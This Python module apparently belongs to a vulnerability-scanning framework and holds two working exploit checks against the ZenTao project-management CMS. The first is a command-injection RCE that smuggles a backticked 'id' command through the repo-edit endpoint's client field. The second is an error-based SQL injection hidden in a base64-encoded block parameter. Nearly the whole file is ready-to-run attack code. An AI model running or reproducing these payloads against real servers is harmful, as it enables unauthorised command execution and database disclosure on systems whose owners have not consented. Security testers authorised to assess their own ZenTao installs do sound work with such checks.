# -*- coding:UTF-8 -*-
from lib.clasetting import random_str
from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.util.fun import randomInt
import lib.util.globalvar as GlobalVar
# 禅道CMS
# https://www.zentao.net/index.html
class zentao():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
            
    def vul_repo_edit_rce(self):
        appName = 'zentao'
        pocname = 'vul_repo_edit_rce'
        headers = {
            # 添加referer
            'Referer' : self.url,
            # Ajax请求
            'X-Requested-With' : 'XMLHttpRequest',
            'Cookie': 'zentaosid={}; lang=zh-cn; device=desktop; theme=default'.format(random_str(26))
            }

        path1 = [
            '/index.php?m=misc&f=captcha&a=user',
            '/index.php?m=repo&f=create',
            '/index.php?m=repo&f=edit&repoID=10000&objectID=10000',
        ]
        path2 = [
            '/misc-captcha-user.html',
            '/repo-create.html',
            '/repo-edit-10000-10000.html',
        ]
        path3 = [
            '/zentao/misc-captcha-user.html',
            '/zentao/repo-create.html',
            '/zentao/repo-edit-10000-10000.html',
        ]
        paths = {
            '/user-login-L3plbnRhby8=.html': path2,
            '/zentao/user-login-L3plbnRhby8=.html': path3,
            '/index.php?m=user&f=login&referer=Lw==': path1,
            }

        data1 = 'product%5B%5D=1&SCM=Gitlab&name={}&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid='.format(str(randomInt(1,1000)))
        data2 = 'SCM=Subversion&client=COMMAND'
        method = 'GET&POST'
        desc = 'RCE'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path_for_login in paths.keys():
                    r = exprequest.get(url=self.url + path_for_login)
                    if '<title>' in r.text and r.status_code == 200:                
                        exprequest.get(url=self.url + paths[path_for_login][0], headers=headers)
                        # condition is fine
                        # if r.content_type == 'image/jpeg' and r.status_code == 200:
                        #     pass
                        # else:
                        #     return output.fail('content_type= %s && status_code=%s'%(r.content_type, str(r.status_code)))
                        exprequest.post(url=self.url + paths[path_for_login][1], headers=headers, data=data1)
                        # dnslog = Dnslog()
                        r = exprequest.post(url=self.url + paths[path_for_login][2], headers=headers, data=data2.replace('COMMAND','`id`'))
                        if 'www-data' in r.text:
                            return output.echo_success(method, desc)
                        else:
                            return output.fail()
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))
        
    def block_getblockdata_sql(self):
        appName = 'zentao'
        pocname = 'block_getblockdata_sql'
        path = '/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsdmVyc2lvbigpKSksMSkjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ=='
        method = 'get'
        desc = 'sql'
        headers = {"Referer": self.url}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(url=self.url+path, headers=headers)
                if r.status_code == 200 and 'XPATH syntax error' in r.text:
                    return output.echo_success(method,desc)
                else:
                    return output.fail()
            else:
                r = exprequest.get(url=self.url+path, headers=headers)
                print(r.text)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpZenTao = zentao(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpZenTao, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(zentao):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpZenTao, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)